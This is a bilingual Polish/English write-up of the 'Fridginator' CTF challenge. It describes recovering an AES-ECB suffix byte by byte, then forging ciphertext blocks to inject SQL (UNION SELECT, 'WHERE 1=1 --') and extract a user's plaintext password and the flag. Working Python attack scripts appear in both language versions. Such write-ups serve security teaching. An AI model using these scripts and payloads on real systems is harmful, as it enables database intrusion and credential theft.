## Fridginator (Crypto/Web, 200p)

> My brother John just bought this high-tech fridge which is all flashy and stuff,
> but has also added some kind of security mechanism which means I can't steal his
> food anymore... I'm not sure I can survive much longer without his amazing yoghurts.
> Can you find a way to steal them for me?
> http://fridge.insomnihack.ch/

### PL
[ENG](#eng-version)

Łączymy się ze wskazanym adresem. Trzeba zarejestrować swojego użytkownika.

Zaczynamy od sprawdzenia co możemy zrobić. Możemy dodawać 'jedzenie' do lodówki, wyciągać swoje jedzenie, oraz wyszukiwać użytkowników i jedzenie.

![](./screen.PNG)

Ta ostatnia opcja wydaje się ciekawa, ponieważ oba pola wyszukiwania prowadzą ostatecznie do bardzo podobnej strony. Wyszukanie użytkownika 'aaa' redirectuje do:

http://fridge.insomnihack.ch/search/c5c376484a22a1a196ced727b32c05ce706fa0919a8b040b2a2ba335c7c45726/

A wyszukanie jedzenia 'aaa' redirectuje do:

http://fridge.insomnihack.ch/search/c5c376484a22a1a196ced727b32c05ceed1a8d4636d71c65dcf1bca14dac7665/

Nasza myśl (jak później się okazało - prawie trafna): być może parametr do search to zaszyfrowane jakimś szyfrem blokowym zapytanie SQL.

Długość bloku to 16 bajtów - można to sprawdzić, bo szyfrowanie 0123456789ABCD daje w wyniki:

    b15fd5ffdae30bbe81f2ba9ec6930473b57ceb7611442a1380e2845a9b916405

A już zaszyfrowanie 0123456789ABCDE (15 znaków) daje:

    b15fd5ffdae30bbe81f2ba9ec6930473cce0dd7d051074345c5a8090ba39d24cb9719c83f5ab5c0751937a39150c920d

Mamy już jedną informację. Teraz możemy sprawdzić czy bloki są w jakiś sposób przeplatane (CTR, CBC), czy szyfrowane niezależnie (ECB):

Zaszyfrowanie aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa daje nam w wyniku:

    5616962f8384b4f8850d8cd1c0adce98 e449af7ccbc7f34f2f1976a5fbfeb93f e449af7ccbc7f34f2f1976a5fbfeb93f e449af7ccbc7f34f2f1976a5fbfeb93f 04ea1913c8d3e7f30d2626ee9dfeff07 f1ad77dcff3212b1a5f83d230610d845

Wyraźnie widać powtarzający się blok na środku (więc mamy do czynienia z ECB), ale pierwszy i ostatni blok się różnią (więc do danych jest doklejany jakiś prefiks i sufiks).

Pierwszą rzeczą jaką zrobiliśmy, było napisanie "fuzzera" do zaszyfrowanych danych - gdyż byliśmy ciekawi co powiedzą nam błędy. Kod jest mało ciekawy (podany w [pliku fuzzer.py](fuzzer.py)), ale wyniki bardziej - spośród wyfuzzowanych kilkuset błedów, najciekawsze dwa:

    <p> Error : no such table: objsearch_user♠ </p>
    <p> Error : unrecognized token: &quot;&#39;i WHERE description LIKE ?&quot; </p>

Ok, mamy już jakieś dane. Co teraz? Wpadliśmy na to, że można wyciągnąć "sufiks" który jest doklejany do naszych danych przed szyfrowaniem - bajt po bajcie.

Jak konkretnie to zrobić - wiemy że dane są szyfrowane blok po bloku. Oznaczając przez [xxxxxxxxx] bloki, (i przez 'a' payload) zaszyfrowane dane wyglądają mniej więcej tak:

    [prefixaaaaa][aaaaaaaaaa][aaaaaaaaaa][aaaaaaasuf][fix_______]

Ale jeśli wyślemy odpowiednio długi content, możemy otrzymać taki układ:

    [prefixaaaaa][aaaaaaaaaa][aaaaaaaaaa][aaaaaaaaas][uffix_____]

Co nam to daje - że czwarty blok tak zaszyfrowanych danych skłąda się z 15 znaków 'a', oraz pierwszego bajtu payloadu.
Wystarczy przebrutować około 100 printowalnych znaków ASCII, i sprawdzić który z nich szyfruje się do tego samego bloku co ten powyżej, i mamy pierwszy znak sufiksu. A później powtarzać aż poznamy cały sufiks.

Napisaliśmy do tego taki skrypt (dość skomplikowany, ponieważ trzeba było zaimplementować szyfrowanie przez stronę):

```python
import requests
import time
import string

prefx_len = 7
sufx_len = 11

def encrypt(payload):
    sessid = 'ln8h6x5zwp6oj2e7kz6zd45hlu97q3yp'
    cookies = {'sessionid': sessid}
    cookies['AWSELB'] = '033F977F02D671BCE8D4F0E661D7CA8279D94E64EF1BD84608DB9FFA0FC0F2F4F304AC9CD30CDCC86788A845DF98A68A77D605B8BF768114D93228AACFB536DE3963E28F295D0C2D52138BA1520672BB1428B11124'
    url0 = 'http://fridge.insomnihack.ch/'

    base = requests.get(url0, cookies=cookies)
    text = base.text

    csrf = "<input type='hidden' name='csrfmiddlewaretoken' value='"
    start = text.find(csrf) + len(csrf)
    token = text[start:start+32]
    cookies['csrftoken'] = token

    url = 'http://fridge.insomnihack.ch/users/'
    resp = requests.post(url, data={'term': payload, 'csrfmiddlewaretoken': token}, cookies=cookies, allow_redirects=False)
    prefx = '/search/'
    loc = resp.headers['location']
    return loc[len(prefx):-1]


prefx = 'p' * prefx_len
known_suffix = ''
for i in range(sufx_len):
    content_len = 48 - prefx_len - len(known_suffix) - 1
    content = 'a' * content_len

    crypted = encrypt(content)
    crypted_chunks = chunks(crypted, 32)
    print crypted_chunks
    sought = crypted_chunks[-2]
    print 'sought', i, sought

    for c in [chr(x) for x in range(256)]:
        payload = content + known_suffix + c
        decrypted = encrypt(payload)
        decrypted_chunks = chunks(decrypted, 32)
        print decrypted_chunks
        result = decrypted_chunks[-2]
        if result == sought:
            print 'got', c
            known_suffix += c
            print known_suffix
            break
```

Sufiks który otrzymaliśmy to:

    |type=user

Jesteśmy w domu. Bo patrząc na błędy które otrzymaliśmy, ten typ jest doklejany bezpośrednio do zapytania - więc możemy zrobić SQLi, jeśli tylko nauczymy się jak "dokleić" coś na koniec zaszyfrowanego tekstu.

A możemy spokojnie dokleić coś na koniec ciphertextu, o ile długość ciphertextu jest wielokrotnością 16 bajtów - obrazowo:

    [prefixaaaaa][aaaaaaaaaa][aaaaaaaaaa][aa|type=user][ WHERE 1=1 --]

Spowoduje wykonanie zapytania w rodzaju

    SELECT (?) FROM objsearch_user WHERE 1=1 -- ???

Idealnie.

A blok `[ Where 1=1 --]` (i dowolny inny) możemy spokojnie zaszyfrować - zrobi to za nas strona. 
Wystarczy, że SQLi które chcemy zaszyfrować będzie wypełniać całkowicie kilka następujących po sobie bloków. 
Wynika to ze słabości ECB - blok plaintextu zawsze jest szyfrowany do tej samej postaci, bez względu na położenie.
Potrzebujemy jedynie dopełnić blok z prefixem (9 bajtów) a potem dodać na końcu naszego SQLi padding (np. spacje), tak żeby suffix dodawany przez serwer trafił w całości do ostaniego bloku:

    [prefix123456789][SQLi part1]...[SQLi partN     ][|type=user]

Wysyłając taki payload otrzymamy w wyniku N+2 bloki. Pierwszy i ostatni blok odrzucamy bo zawierają tylko prefix i suffix od serwera, a wszystkie pozostałe zawierają nasz kod.
Możemy je teraz wstawić pomiędzy dowolne inne bloki a serwer zdekoduje je i doklei w odpowiednie miejsce.

Jest tylko jedna pułapka - padding. Dane szyfrowane szyfrem blokowym muszą mieć długośc równą wielokrotności 16 bajtów. Co jeśli są krótsze?

Jeden z popularnych schematów paddingu (konkretnie, PKCS7) działa tak:
* jeśli danym do wielokrotności 16 bajtów brakuje 1 bajta - doklej na koniec '\x01'
* jeśli danym do wielokrotności 16 bajtów brakuje 2 bajtów - doklej na koniec '\x02\x02'
* jeśli danym do wielokrotności 16 bajtów brakuje 3 bajtów - doklej na koniec '\x03\x03\x03'
* ...
* i uwaga, jeśli danym już są wielokrotnością 16 bajtów - doklej na koniec '\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10'

Ostatni warunek jest konieczny, żeby deszyfrowanie było zawsze jednoznaczne. Tak więc trzeba pamiętać, że ostatni zaszyfrowany blok będzie "fałszywym" blokiem składającym się wyłącznie z bajtów 0x10, i musimy go pominąć a później dokleić na końcu.

Łącząc te wszystkie pomysły, napisaliśmy taki kod [final.py](final.py):

```python
def hack(query):
    parts = encrypt2(query)
    part = ''.join(parts)
    prfx = 'b15fd5ffdae30bbe81f2ba9ec6930473cce0dd7d051074345c5a8090ba39d24c'
    sufx = 'b9719c83f5ab5c0751937a39150c920d'
    return prfx + part + sufx 

def hack2(query):
    payload = hack(query)
    session = '16if76517xm5zvvwn0l09yq8hqwbgdi5'
    cookies = {'sessionid': session}
    cookies[
        'AWSELB'] = '033F977F02D671BCE8D4F0E661D7CA8279D94E64EFD0AA7BC023208F4937F97452EF3E07B21CF2698ED17FB3AE4D8A6166A17A44ACBC6810BEC0739D56BBE463F63CC54BC91275B57E8FE8CBB9B39F65DFAFFA27C1'
    url = 'http://fridge.insomnihack.ch/search/'
    r = requests.get(url + payload, cookies=cookies)
    return r.text

def hack3(query):
    return hack2(' union all select 1, (' + query + '), 3, 4, 5 union all select 1, 2, 3, 4, 5 from objsearch_user ')

import sys
print hack3(sys.argv[1])
```

Pozwala on trywialnie wykonać dowolne zapytanie na bazie - wygląda na to żę zadanie praktycznie zrobione

Jedyne trzy tabele które znaleźliśmy (niestety, nie mamy screenów) to objsearch_user, objsearch_object oraz sqlite_sequence.

Wyciągneliśmy więc po prostu DDL dla objsearch_user:

    CREATE TABLE &quot;objsearch_user&quot; (&quot;id&quot; integer NOT NULL PRIMARY KEY AUTOINCREMENT, &quot;username&quot; varchar(200) NOT NULL, &quot;description&quot; varchar(2000) NOT NULL, &quot;password&quot; varchar(200) NOT NULL, &quot;email&quot; varchar(200) NOT NULL)

A następnie wyciągneliśmy "password" dla użytkownika "John" - okazało się być plaintextowe:

    SuperDuperPasswordOfTheYear!!!

Wystarczyło w tym momencie zalogowąć się na użytkownika John i "wyciągnąć" jego jedzenie z lodówki:

    Hello Johnny, have your food and a flag, because why not? INS{I_do_encryption_so_no_SQL_injection}

### ENG version

We connect to address specified in task description. 

After registering our user, we check what we can do. We can add 'food' to fridge, took 'food' out, and search for users and food.

![](./screen.PNG)

Last option is particulary interesting, because both search fields directs us to the same page in the end. Searching for user named 'aaa' redirects us to:

http://fridge.insomnihack.ch/search/c5c376484a22a1a196ced727b32c05ce706fa0919a8b040b2a2ba335c7c45726/

And searching for food called 'aaa' redirects to:

http://fridge.insomnihack.ch/search/c5c376484a22a1a196ced727b32c05ceed1a8d4636d71c65dcf1bca14dac7665/

Our first thought was (and it turned out, we were almost right) - maybe parameter passed to search is encrypted SQL query.

It certinally looks like that - block length is 16 bytes, and it can be easily verified. Encrypting 0123456789ABCD (14 chars) gives us:

    b15fd5ffdae30bbe81f2ba9ec6930473b57ceb7611442a1380e2845a9b916405

And encrypting 0123456789ABCDE (15 chars):

    b15fd5ffdae30bbe81f2ba9ec6930473cce0dd7d051074345c5a8090ba39d24cb9719c83f5ab5c0751937a39150c920d

So we know something about cipher already. Now we can check, if blocks are related in any way (CTR, CBC) or completly independent (ECB):

Encrypting aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa gives us:

    5616962f8384b4f8850d8cd1c0adce98 e449af7ccbc7f34f2f1976a5fbfeb93f e449af7ccbc7f34f2f1976a5fbfeb93f e449af7ccbc7f34f2f1976a5fbfeb93f 04ea1913c8d3e7f30d2626ee9dfeff07 f1ad77dcff3212b1a5f83d230610d845

We can clearly see repeating block in the middle (so we are dealing with ECB mode - yay). But first and last blocks are different - so we can conclude that server is adding some secret prefix and suffix to our data (this matches our hypothesis about SQL query, by the way).

First thing we did were implementing "fuzzer" for encrypted data (randomly changing last block and checking results) - because we were curious what the errors will be. Fuzzer code is not particulary interesting (you can find it in [fuzzer.py file](fuzzer.py)), but it gave us interesing results. Especially these two errors catched our eye:

    <p> Error : no such table: objsearch_user♠ </p>
    <p> Error : unrecognized token: &quot;&#39;i WHERE description LIKE ?&quot; </p>

So we know even more about server operatins. Now what? We found out that we can bruteforce 'suffix' appended to our data.

We know that block cipher is used. I will denote each encrypted block like `[xxxxxxxxx]`. So encrypted request looks like this:

    [prefixaaaaa][aaaaaaaaaa][aaaaaaaaaa][aaaaaaasuf][fix_______]

But, when we use long enough content, we can get something like this:

    [prefixaaaaa][aaaaaaaaaa][aaaaaaaaaa][aaaaaaaaas][uffix_____]

(Only one byte of suffix is inside fourth block). Why would we do that? Because now we can bruteforca all possible bytes, and check when encrypting "aaaaaaaaaa" + (next byte) gives the same result that encrypting "aaaaaaaa" + (first byte of suffix).

Now we created another script, used to get entire suffix:

```python
import requests
import time
import string

prefx_len = 7
sufx_len = 11

def encrypt(payload):
    sessid = 'ln8h6x5zwp6oj2e7kz6zd45hlu97q3yp'
    cookies = {'sessionid': sessid}
    cookies['AWSELB'] = '033F977F02D671BCE8D4F0E661D7CA8279D94E64EF1BD84608DB9FFA0FC0F2F4F304AC9CD30CDCC86788A845DF98A68A77D605B8BF768114D93228AACFB536DE3963E28F295D0C2D52138BA1520672BB1428B11124'
    url0 = 'http://fridge.insomnihack.ch/'

    base = requests.get(url0, cookies=cookies)
    text = base.text

    csrf = "<input type='hidden' name='csrfmiddlewaretoken' value='"
    start = text.find(csrf) + len(csrf)
    token = text[start:start+32]
    cookies['csrftoken'] = token

    url = 'http://fridge.insomnihack.ch/users/'
    resp = requests.post(url, data={'term': payload, 'csrfmiddlewaretoken': token}, cookies=cookies, allow_redirects=False)
    prefx = '/search/'
    loc = resp.headers['location']
    return loc[len(prefx):-1]


prefx = 'p' * prefx_len
known_suffix = ''
for i in range(sufx_len):
    content_len = 48 - prefx_len - len(known_suffix) - 1
    content = 'a' * content_len

    crypted = encrypt(content)
    crypted_chunks = chunks(crypted, 32)
    print crypted_chunks
    sought = crypted_chunks[-2]
    print 'sought', i, sought

    for c in [chr(x) for x in range(256)]:
        payload = content + known_suffix + c
        decrypted = encrypt(payload)
        decrypted_chunks = chunks(decrypted, 32)
        print decrypted_chunks
        result = decrypted_chunks[-2]
        if result == sought:
            print 'got', c
            known_suffix += c
            print known_suffix
            break
```

And the result was (this is the suffix that server appends to our message):

    |type=user

Now we are talking. Looking at error messages we got earlier, it is clear that this "type" is appended to SQL query directly - so we could do textbook SQL injection with this field. If only we could append something to encrypted text...

And it turns out we can! Imagine that length of ciphertext is multiple of 16 bytes:

    [prefixaaaaa][aaaaaaaaaa][aaaaaaaaaa][aa|type=user]

We can append block with encrypted `[ WHERE 1=1 --]` to the end, and the result will be:

    [prefixaaaaa][aaaaaaaaaa][aaaaaaaaaa][aa|type=user][ WHERE 1=1 --]

And it will cause following query to be executed:

    SELECT (?) FROM objsearch_user WHERE 1=1 -- ???

Great. Now we need to get our SQLi code in the form of ecnrypted blocks so we can append them somewhere.
We can do this easily using the server itself for encryption, as long as our code will be filling entirely consecutive encryption blocks.
This is a weakness of ECB encryption mode - plaintext block is always encrypted into the same cipher block, regardless of the position in input.
We need only to fill the prefix block (missing 9 bytes) and then add some padding (eg. spaces) to our SQLi so that the server suffix ends up in the last block:

    [prefix123456789][SQLi part1]...[SQLi partN     ][|type=user]

By sending such payload we will get N+2 blocks. First one contains prefix and our filling, last one only suffix, and all the rest contain our encrypted SQLi code.
Now we can put those blocks in between any other blocks and the server will decrypt them and glue in this place.

One last think we have to watch out - padding. Length of data encrypted with block cipher must be multiple of 16 bytes, always. What if we are encrypting something shorter? That's when padding comes in:

One of popular padding schemes (PKCS7 to be precise) works as follows:
* if last block is 1 byte short of 16 bytes, append '\x01' to the end
* if last block is 2 bytes short of 16 bytes, append '\x02\x02' to the end
* if last block is 3 bytes short of 16 bytes, append '\x03\x03\x03' to the end
* ...
* and, important: if length of ciphertext is exactly multiple of 16 bytes, append '\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10'

Last condition is necessary, because otherwise we cannot uniquely remove padding. So we have to remember that even though data we are encrypting IS multiple of 16 bytes, last block will be phony block consisting only of 0x10 bytes, and we will have to append it after processing.

Finally, merging all these ideas, we wrote following tool: [final.py](final.py):

```python
def hack(query):
    parts = encrypt2(query)
    part = ''.join(parts)
    prfx = 'b15fd5ffdae30bbe81f2ba9ec6930473cce0dd7d051074345c5a8090ba39d24c'
    sufx = 'b9719c83f5ab5c0751937a39150c920d'
    return prfx + part + sufx 

def hack2(query):
    payload = hack(query)
    session = '16if76517xm5zvvwn0l09yq8hqwbgdi5'
    cookies = {'sessionid': session}
    cookies[
        'AWSELB'] = '033F977F02D671BCE8D4F0E661D7CA8279D94E64EFD0AA7BC023208F4937F97452EF3E07B21CF2698ED17FB3AE4D8A6166A17A44ACBC6810BEC0739D56BBE463F63CC54BC91275B57E8FE8CBB9B39F65DFAFFA27C1'
    url = 'http://fridge.insomnihack.ch/search/'
    r = requests.get(url + payload, cookies=cookies)
    return r.text

def hack3(query):
    return hack2(' union all select 1, (' + query + '), 3, 4, 5 union all select 1, 2, 3, 4, 5 from objsearch_user ')

import sys
print hack3(sys.argv[1])
```

It allows us to trivially execute any SQL query on database - looks like we managed to solve challenge.

We found three tables in database: objsearch_user, objsearch_object and sqlite_sequence.

So we just queried sqlite_master for DDL for objsearch_user:

    CREATE TABLE &quot;objsearch_user&quot; (&quot;id&quot; integer NOT NULL PRIMARY KEY AUTOINCREMENT, &quot;username&quot; varchar(200) NOT NULL, &quot;description&quot; varchar(2000) NOT NULL, &quot;password&quot; varchar(200) NOT NULL, &quot;email&quot; varchar(200) NOT NULL)

And then we queried password for user "John" - it turned out that passwords were stored in plain text!

    SuperDuperPasswordOfTheYear!!!

And finally, we logged in into John user and took food from his fridge (like task's description told us to):

    Hello Johnny, have your food and a flag, because why not? INS{I_do_encryption_so_no_SQL_injection}

